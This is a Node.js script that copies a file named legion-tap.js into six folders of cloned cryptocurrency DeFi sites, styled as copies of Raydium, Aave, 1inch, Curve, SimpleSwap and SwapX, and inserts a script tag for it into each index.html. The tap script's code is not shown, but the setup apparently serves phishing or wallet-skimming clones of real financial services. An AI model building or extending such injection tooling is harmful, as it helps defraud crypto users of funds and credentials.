/**
 * inject-all.js — Injects legion-tap.js into all clone site index.html files
 * Run with: node clones/inject-all.js
 */
const fs = require('fs');
const path = require('path');

// Target clone sites and their index.html paths
const CLONE_DIR = 'C:\\Users\\HP\\Downloads\\Trzr recording';
const TAP_SCRIPT_TAG = '<script src="/legion-tap.js" defer></script>';

const TARGETS = [
  { name: 'raydium-clone',  html: path.join(CLONE_DIR, 'raydium-clone', 'index.html') },
  { name: 'aave-pro-clone', html: path.join(CLONE_DIR, 'aave-pro-clone', 'index.html') },
  { name: '1inch-exact',    html: path.join(CLONE_DIR, '1inch-exact', 'index.html') },
  { name: 'curve-exact',    html: path.join(CLONE_DIR, 'curve-exact', 'index.html') },
  { name: 'simpleswap-exact', html: path.join(CLONE_DIR, 'simpleswap-exact', 'index.html') },
  { name: 'swapx-exact',    html: path.join(CLONE_DIR, 'swapx-exact', 'index.html') },
];

// Also copy legion-tap.js into each clone's root (for /legion-tap.js to resolve)
const TAP_SRC = path.join(__dirname, 'legion-tap.js');

let ok = 0;
let skip = 0;
let err = 0;

for (const target of TARGETS) {
  try {
    if (!fs.existsSync(target.html)) {
      console.log(`[SKIP]  ${target.name} — index.html not found: ${target.html}`);
      skip++;
      continue;
    }

    // Copy legion-tap.js to clone root so the browser can fetch /legion-tap.js
    const cloneRoot = path.dirname(target.html);
    const tapDest = path.join(cloneRoot, 'legion-tap.js');
    fs.copyFileSync(TAP_SRC, tapDest);
    console.log(`[COPY]  ${target.name} — legion-tap.js → ${tapDest}`);

    let html = fs.readFileSync(target.html, 'utf8');

    // Skip if already injected
    if (html.includes('legion-tap.js')) {
      console.log(`[SKIP]  ${target.name} — already injected`);
      skip++;
      continue;
    }

    // Inject just before </head> if present, else just before </body>, else at end
    if (html.includes('</head>')) {
      html = html.replace('</head>', `  ${TAP_SCRIPT_TAG}\n</head>`);
    } else if (html.includes('</body>')) {
      html = html.replace('</body>', `  ${TAP_SCRIPT_TAG}\n</body>`);
    } else {
      html += `\n${TAP_SCRIPT_TAG}\n`;
    }

    fs.writeFileSync(target.html, html, 'utf8');
    console.log(`[OK]    ${target.name} — injected`);
    ok++;
  } catch (e) {
    console.error(`[ERR]   ${target.name} — ${e.message}`);
    err++;
  }
}

console.log(`\nDone: ${ok} injected, ${skip} skipped, ${err} errors`);
console.log('\nNOTE: For React/Vite clones (swapx-exact), also add to public/ folder');
console.log('      and import in src/main.tsx: import "/legion-tap.js"');
